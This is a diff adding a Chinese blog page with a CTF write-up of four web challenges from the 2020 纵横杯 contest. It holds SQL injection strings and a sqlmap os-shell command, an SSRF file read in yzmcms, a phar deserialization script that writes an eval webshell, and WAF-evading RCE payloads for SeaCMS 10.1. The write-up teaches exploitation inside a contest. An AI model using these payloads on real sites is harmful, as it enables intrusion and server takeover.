@@ -1,0 +1,183 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><meta name="author" content="AMao"><meta name="renderer" content="webkit"><meta name="copyright" content="AMao"><meta name="keywords" content="AMao's Blog"><meta name="description" content=""><meta name="Cache-Control" content="no-cache"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><title>纵横杯2020 wp · AMao's Blog</title><link rel="stylesheet" href="/css/style.css?v=2018.7.9"><link rel="stylesheet" href="/css/animation.css?v=2018.7.9"><link rel="icon" href="/img/assets/favicon.ico"><link rel="stylesheet" href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css?version=1.5.6"><!-- scripts--><script>(function( w ){
+  "use strict";
+  // rel=preload support test
+  if( !w.loadCSS ){
+    w.loadCSS = function(){};
+  }
+  // define on the loadCSS obj
+  var rp = loadCSS.relpreload = {};
+  // rel=preload feature support test
+  // runs once and returns a function for compat purposes
+  rp.support = (function(){
+    var ret;
+    try {
+      ret = w.document.createElement( "link" ).relList.supports( "preload" );
+    } catch (e) {
+      ret = false;
+    }
+    return function(){
+      return ret;
+    };
+  })();
+
+  // if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+  // then change that media back to its intended value on load
+  rp.bindMediaToggle = function( link ){
+    // remember existing media attr for ultimate state, or default to 'all'
+    var finalMedia = link.media || "all";
+
+    function enableStylesheet(){
+      link.media = finalMedia;
+    }
+
+    // bind load handlers to enable media
+    if( link.addEventListener ){
+      link.addEventListener( "load", enableStylesheet );
+    } else if( link.attachEvent ){
+      link.attachEvent( "onload", enableStylesheet );
+    }
+
+    // Set rel and non-applicable media type to start an async request
+    // note: timeout allows this to happen async to let rendering continue in IE
+    setTimeout(function(){
+      link.rel = "stylesheet";
+      link.media = "only x";
+    });
+    // also enable media after 3 seconds,
+    // which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+    setTimeout( enableStylesheet, 3000 );
+  };
+
+  // loop through link elements in DOM
+  rp.poly = function(){
+    // double check this to prevent external calls from running
+    if( rp.support() ){
+      return;
+    }
+    var links = w.document.getElementsByTagName( "link" );
+    for( var i = 0; i < links.length; i++ ){
+      var link = links[ i ];
+      // qualify links to those with rel=preload and as=style attrs
+      if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+        // prevent rerunning on link
+        link.setAttribute( "data-loadcss", true );
+        // bind listeners to toggle media back
+        rp.bindMediaToggle( link );
+      }
+    }
+  };
+
+  // if unsupported, run the polyfill
+  if( !rp.support() ){
+    // run once at least
+    rp.poly();
+
+    // rerun poly on an interval until onload
+    var run = w.setInterval( rp.poly, 500 );
+    if( w.addEventListener ){
+      w.addEventListener( "load", function(){
+        rp.poly();
+        w.clearInterval( run );
+      } );
+    } else if( w.attachEvent ){
+      w.attachEvent( "onload", function(){
+        rp.poly();
+        w.clearInterval( run );
+      } );
+    }
+  }
+
+
+  // commonjs
+  if( typeof exports !== "undefined" ){
+    exports.loadCSS = loadCSS;
+  }
+  else {
+    w.loadCSS = loadCSS;
+  }
+}( typeof global !== "undefined" ? global : this ) );</script><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" defer></script><script src="/js/main.js?v=2018.7.9" defer></script><!-- fancybox--><link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'"><script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script><!-- busuanzi--><script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script></head><body><section class="profile-close" id="cxo-profile"><div class="profile-avatar"><i class="fa fa-caret-left"></i><img src="/img/assets/cat.png"></div><!--.profile-saying
+  i.fa.fa-comment
+  .saying--><div class="cxo-profile-inner"><div class="profile-name">AMao</div><div class="profile-signature">小菜鸡目前对一些东西的认知，希望师傅们可以帮忙纠正！</div><div class="read-progress"></div></div></section><header id="cxo-intro" style="height: 70vh;background-image: url(/img/intro/index-bg.png);"><nav id="cxo-intro-nav"><section><div class="intro-nav-title"><a href="/">AMao's Blog</a></div><div class="intro-nav-label-box"><a href="/">Home</a><a href="/archives/">Archives</a><a href="/tags/">Tags</a></div><i class="fa fa-bars intro-nav-menu"><div class="intro-nav-drop"><a href="/">Home</a><a href="/archives/">Archives</a><a href="/tags/">Tags</a></div></i><div class="clear"></div></section></nav><h1 class="post-title">纵横杯2020 wp</h1><div class="post-intros"><div class="post-intro-meta"><span class="post-intro-time"><i class="post-intro-calendar fa fa-calendar"></i><span>2020-12-26</span></span><span class="post-intro-tags"><a class="intro-tag fa fa-tag" href="javascript:void(0)" target="_blank" rel="noopener" date-tags="CTF"> CTF</a></span></div><div class="post-intro-read"><span> Word count: <span class="post-count">773</span> | Reading time: <span class="post-count">3</span>min</span></div></div></header><article class="cxo-up" id="cxo-content-outer"><section id="cxo-content-inner"><article class="article-entry" id="post"><h2 id="easyci"><a href="#easyci" class="headerlink" title="easyci"></a>easyci</h2><blockquote>
+<p>开始觉得应该是ci session伪造，后面发现是4.0.3版本</p>
+<p>后面爆出登录口令 admn/HEIHEIHEIHEI，登录上去也没什么内容</p>
+<p>目录扫描也没发现新的，就对登录页面进行注入测试，这里的注入是盲注，回显</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username=admin&apos; AND 3772=3772 AND &apos;xCyp&apos;=&apos;xCyp&amp;password=HEIHEIHEIHEI</span><br><span class="line">username=admin&apos; AND (SELECT 1344 FROM (SELECT(SLEEP(5)))UlpO) AND &apos;Hrgt&apos;=&apos;Hrgt&amp;password=HEIHEIHEIHEI</span><br></pre></td></tr></table></figure>
+</blockquote>
+<ul>
+<li><p>大写绕过 select和union过滤</p>
+<blockquote>
+<p>后面就直接用sqlmap</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python .\sqlmap.py -r rr.txt -tamper uppercase --os-shell</span><br></pre></td></tr></table></figure>
+</blockquote>
+</li>
+<li><p>读取apache文件获取Web目录</p>
+<blockquote>
+<p>一般是：<code>/etc/httpd/conf/httpd.conf</code> 或 <code>/usr/local/apache2/httpd.conf</code> （使用源码安装）或 <code>/etc/apache2/httpd.conf</code> （apt-get安装）</p>
+<p>配置文件名为 <code>apache2.conf</code> 或 <code>httpd.conf</code> ：在apache2 <code>httpd.conf</code> 已弃用，用户自定义配置放置在 <code>conf-available/{name}.conf</code></p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/var/sercet/html</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>cat flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / |grep &quot;flag&quot;</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<h2 id="ezcms"><a href="#ezcms" class="headerlink" title="ezcms"></a>ezcms</h2><blockquote>
+<p>yzmcms，登录口令：admin/admin868</p>
+<p>进入后台发现版本是 yzmcms5.8 ，yzmphp2.2</p>
+</blockquote>
+<p> <a href="https://github.com/yzmcms/yzmcms/issues/53" target="_blank" rel="noopener">https://github.com/yzmcms/yzmcms/issues/53</a></p>
+<p>模板管理 -&gt; 采集管理  -&gt;  URL处填入 <code>http://Your_IP/ssrf.html</code>  ，采集范围写入 <code>&lt;ss123&gt;&lt;/ss123&gt;</code></p>
+<ul>
+<li><p>ssrf.html</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;ss123&gt;&lt;a href=&quot;httpxxx://../../../../../../flag&quot;&gt;123&lt;/a&gt;&lt;/ss123&gt;</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<h2 id="hellophp"><a href="#hellophp" class="headerlink" title="hellophp"></a>hellophp</h2><blockquote>
+<p>源码泄露–&gt; admin/admin888</p>
+<p>修改配置到config.php</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file_put_contents(pathinfo($_SERVER[&apos;SCRIPT_FILENAME&apos;])[&apos;dirname&apos;].&apos;/config.php&apos;, $file);</span><br></pre></td></tr></table></figure>
+
+<p>但是修改title的功能并没有实现</p>
+</blockquote>
+<blockquote>
+<p>Config 类的 __destruct() 函数也有写入 config.php 文件的操作，就想到 phar 反序列化，admin.php 有上传功能， index.php 中又有 <code>file_exists($_GET[&#39;img&#39;])</code> 恰好可以触发 phar</p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Config</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $title;</span><br><span class="line">    <span class="keyword">public</span> $comment;</span><br><span class="line">    <span class="keyword">public</span> $logo_url;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;title= <span class="string">'123\';echo 123;@eval($_POST[1]);?&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">"aaa.phar"</span>); <span class="comment">//后缀名必须为 phar</span></span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar -&gt; setStub(<span class="string">'GIF89a'</span>.<span class="string">'&lt;?php __HALT_COMPILER();?&gt;'</span>);</span><br><span class="line">$object = <span class="keyword">new</span> Config;</span><br><span class="line">$phar-&gt;setMetadata($object); <span class="comment">//将自定义的 meta-data 存入 manifest</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">"a.txt"</span>, <span class="string">"a"</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>文件路径是无法获取，但是根据 class.php 中 <code>$path=&#39;./static/&#39;.md5(time()).&#39;.jpg&#39;;</code> 可以进行爆破，本地运行下面脚本，再在浏览器上传</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> req </span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5_encode</span><span class="params">(s)</span>:</span></span><br><span class="line">	<span class="keyword">return</span> hashlib.md5(s.encode()).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">	url = <span class="string">f"http://127.0.0.1/static/<span class="subst">&#123;md5_encode(str(int(time.time())))&#125;</span>.jpg"</span></span><br><span class="line">	r = req.get(url)</span><br><span class="line">	<span class="keyword">if</span> r.status_code == <span class="number">200</span>:</span><br><span class="line">		print(url)</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line">	time.sleep(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+</blockquote>
+<blockquote>
+<p>触发 phar 反序列化</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php/?img=phar://./static/2c7fcadf6e92d41f51d8e4d6f6094faa.jpg</span><br></pre></td></tr></table></figure>
+</blockquote>
+<blockquote>
+<p>绕过 disable_function </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1=var_dump(file_get_contents (&apos;/flag&apos;));</span><br></pre></td></tr></table></figure>
+</blockquote>
+<h2 id="大家一起来代码审计"><a href="#大家一起来代码审计" class="headerlink" title="大家一起来代码审计"></a>大家一起来代码审计</h2><blockquote>
+<p>海洋cms 10.1</p>
+<p>后台：admin/admin</p>
+</blockquote>
+<blockquote>
+<p>使用已经公开的漏洞，IP页面或weixin页面的rce：<a href="https://www.freebuf.com/vuls/241106.html" target="_blank" rel="noopener">link</a></p>
+<blockquote>
+<p>rce：</p>
+<p><code>/adm1n/admin_weixin.php</code> 自动回复处没有进行任何过滤，直接拼接后写入文件，导致rce</p>
+</blockquote>
+<p>首先要用<code>&quot;);</code>闭合，再插入代码，但是这里加了一层waf，无法直接写入 webshell，使用取反的方法</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">php &gt; $a = <span class="string">"system"</span>;</span><br><span class="line">php &gt; <span class="keyword">echo</span> urlencode(~$a);</span><br><span class="line">%<span class="number">8</span>C%<span class="number">86</span>%<span class="number">8</span>C%<span class="number">8</span>B%<span class="number">9</span>A%<span class="number">92</span></span><br><span class="line">php &gt; $b = <span class="string">"cat /flag"</span>;</span><br><span class="line">php &gt; <span class="keyword">echo</span> urlencode(~$b);</span><br><span class="line">%<span class="number">9</span>C%<span class="number">9</span>E%<span class="number">8</span>B%DF%D0%<span class="number">99</span>%<span class="number">93</span>%<span class="number">9</span>E%<span class="number">98</span></span><br><span class="line">php &gt; </span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;);$z=&apos;%8C%86%8C%8B%9A%92&apos;;$p=~&apos;%9C%9E%8B%DF%D0%99%93%9E%98&apos;;$z=~$z;$z($p);//</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</blockquote>
+<h3 id="其他解"><a href="#其他解" class="headerlink" title="其他解"></a>其他解</h3><blockquote>
+<p>后台，百度密钥处<br><code>&quot;;system(&quot;cat /flag&quot;);eval($_GET[&#39;1&#39;]);/*</code></p>
+</blockquote>
+</article><!-- lincense--><div class="license-wrapper"><p> <span>Author:  </span><a href="https://passenger-amao.github.io">AMao</a></p><p> <span>Link:  </span><a href="https://passenger-amao.github.io/2020/12/26/%E7%BA%B5%E6%A8%AA%E6%9D%AF2020/">https://passenger-amao.github.io/2020/12/26/%E7%BA%B5%E6%A8%AA%E6%9D%AF2020/</a></p><p> <span>Copyright:  </span><span>本站所有文章均采用 <a rel="license noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">署名-非商业性使用-相同方式共享 4.0 国际(CC BY-NC-SA 4.0)</a> 许可协议。转载请注明出处！</span></p></div><div class="post-paginator"><a class="nextSlogan" href="/2020/09/24/burp%E4%B8%ADHTTPS%E4%BB%A3%E7%90%86%E5%8E%9F%E7%90%86/" title="burp中HTTPS代理原理分析"><span>NextPost ></span><br><span class="nextTitle">burp中HTTPS代理原理分析</span></a><div class="clear"></div></div><div id="comment"></div></section></article><footer id="cxo-footer-outer"><div id="cxo-footer-inner"><p class="footer-container"><span>Site by </span><a href="http://hexo.io" target="_blank" rel="noopener"><span>Hexo</span></a><span> | theme </span><a href="https://github.com/Longlongyu/hexo-theme-Cxo" target="_blank" rel="noopener"><span>Cxo</span></a></p><i class="fa fa-user"> </i><span id="busuanzi_value_site_uv"></span><span> | </span><i class="fa fa-eye"> </i><span id="busuanzi_value_site_pv"></span></div></footer><!-- catelog--><div class="toc-wrapper" style="top: 70vh;"><div class="toc-catalog"><i class="fa fa-list"> </i><span>CATALOG</span></div><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#easyci"><span class="toc-number">1.</span> <span class="toc-text">easyci</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ezcms"><span class="toc-number">2.</span> <span class="toc-text">ezcms</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#hellophp"><span class="toc-number">3.</span> <span class="toc-text">hellophp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#大家一起来代码审计"><span class="toc-number">4.</span> <span class="toc-text">大家一起来代码审计</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#其他解"><span class="toc-number">4.1.</span> <span class="toc-text">其他解</span></a></li></ol></li></ol></div><!-- top--><i class="fa fa-arrow-up close" id="go-up" aria-hidden="true"></i></body></html>
